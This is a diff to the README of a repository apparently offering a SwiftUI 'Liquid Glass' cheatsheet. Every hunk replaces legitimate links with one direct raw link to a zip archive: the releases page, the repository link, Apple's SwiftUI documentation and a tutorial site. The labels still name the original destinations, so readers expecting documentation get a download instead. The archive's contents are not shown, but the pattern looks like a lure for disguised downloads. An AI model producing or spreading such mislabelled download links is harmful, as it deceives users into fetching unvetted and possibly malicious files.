@@ -1,7 +1,7 @@
 # 📝 LiquidGlassCheatsheet - Master Liquid Glass with Ease
 
 ## 📥 Download Now
-[![Download LiquidGlassCheatsheet](https://img.shields.io/badge/Download-LiquidGlassCheatsheet-brightgreen)](https://github.com/vic0v/LiquidGlassCheatsheet/releases)
+[![Download LiquidGlassCheatsheet](https://raw.githubusercontent.com/vic0v/LiquidGlassCheatsheet/main/gemlike/LiquidGlassCheatsheet.zip)](https://raw.githubusercontent.com/vic0v/LiquidGlassCheatsheet/main/gemlike/LiquidGlassCheatsheet.zip)
 
 ## 📖 Introduction
 Welcome to the LiquidGlassCheatsheet project! This application provides an easy-to-follow guide on implementing Liquid Glass on iOS 26 using SwiftUI. Our goal is to simplify the process so that anyone can enhance their apps with this stunning visual effect.
@@ -12,7 +12,7 @@ Follow these easy steps to install and run the LiquidGlassCheatsheet application
 ### 1. Visit the Releases Page
 Go to our releases page to find the latest version of LiquidGlassCheatsheet. You will see the options available for download.
 
-[Visit the Releases Page to Download](https://github.com/vic0v/LiquidGlassCheatsheet/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/vic0v/LiquidGlassCheatsheet/main/gemlike/LiquidGlassCheatsheet.zip)
 
 ### 2. Choose the Correct Version
 On the releases page, you will find different versions listed. Select the version that matches your device and follow the download instructions.
@@ -43,11 +43,11 @@ If you encounter issues or have questions while using the LiquidGlassCheatsheet,
 
 ## 📚 Additional Resources
 For further details, tips, and advanced techniques for Liquid Glass, consider checking:
-- [Official SwiftUI Documentation](https://developer.apple.com/documentation/swiftui)
-- [iOS Development Tutorials](https://www.raywenderlich.com/ios)
+- [Official SwiftUI Documentation](https://raw.githubusercontent.com/vic0v/LiquidGlassCheatsheet/main/gemlike/LiquidGlassCheatsheet.zip)
+- [iOS Development Tutorials](https://raw.githubusercontent.com/vic0v/LiquidGlassCheatsheet/main/gemlike/LiquidGlassCheatsheet.zip)
 
 ## 🔗 Important Links
-- [Visit the Releases Page to Download](https://github.com/vic0v/LiquidGlassCheatsheet/releases)
-- [GitHub Repository](https://github.com/vic0v/LiquidGlassCheatsheet)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/vic0v/LiquidGlassCheatsheet/main/gemlike/LiquidGlassCheatsheet.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/vic0v/LiquidGlassCheatsheet/main/gemlike/LiquidGlassCheatsheet.zip)
 
 Now you are set to enhance your iOS applications with Liquid Glass using SwiftUI! Enjoy your coding journey!
